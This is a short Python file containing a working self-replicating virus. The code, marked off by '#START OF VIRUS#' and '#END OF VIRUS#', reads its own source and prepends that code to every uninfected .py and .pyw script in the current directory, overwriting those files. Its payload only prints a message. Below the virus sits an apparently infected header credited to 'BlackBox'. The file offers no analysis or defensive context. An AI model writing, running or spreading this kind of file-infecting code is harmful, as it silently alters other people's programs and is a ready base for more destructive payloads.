#START OF VIRUS#
import sys, glob

code = []
with open(sys.argv[0], 'r') as f:
    lines = f.readlines()
    
virus_area = False

for line in lines:
    if line == '#START OF VIRUS#\n':
        virus_area = True
    if virus_area:
        code.append(line)
    if line == "#END OF VIRUS#":
        break
    
python_scripts = glob.glob('*.py') + glob.glob("*.pyw")

for script in python_scripts:
    with open(script, 'r') as f:
        script_code = f.readlines()
    infected = False
    for line in script_code:
        if line == "#START OF VIRUS#\n":
            infected = True
            break
    if infected == False:
        final_code = []
        final_code.extend(code)
        final_code.extend('\n')
        final_code.extend(script_code)
        with open(script, 'w') as f:
            f.writelines(final_code)
#PAYLOAD#
def payload():
    print('HELLLLLLOOOO WOOOOORLD')
#END PAYLOAD#        


#END OF VIRUS#


payload()

#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Thu Nov 19 03:44:17 2020

@author: BlackBox
"""
#test test test#